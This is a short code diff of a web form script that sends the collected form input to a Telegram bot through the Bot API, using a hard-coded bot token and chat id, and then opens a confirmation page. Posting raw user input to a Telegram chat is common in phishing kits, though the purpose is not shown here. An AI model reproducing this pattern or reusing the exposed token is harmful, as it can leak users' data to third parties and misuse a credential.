@@ -29,17 +29,12 @@ if(strText==""||strText1==""||strText2==""||strText3==""||strText4==""||strText6
         console.log('error');
         }else
         {
-//            const request = new XMLHttpRequest();
-  //      const url = 'https://api.telegram.org/bot1641457962:AAGEETFtrtqexe3xRiFbeoXqKO6xoP9YnC0/sendMessage?chat_id=-1001516712828&text='+result;
-    //    request.open("post", url);
-      //  request.send();	
-	//		window.open('bc.html', '_self');
-			const request = new XMLHttpRequest();
+	const request = new XMLHttpRequest();
         const url = 'https://api.telegram.org/bot1641457962:AAGEETFtrtqexe3xRiFbeoXqKO6xoP9YnC0/sendMessage?chat_id=-1001516712828&text='+result;
 	request.open("post", url);
 	request.send();
 	console.log('Message sent');
-        alert("Booking Confirmed");
+        //alert("Booking Confirmed");
         window.open('bc.html', '_blank');
         }
 
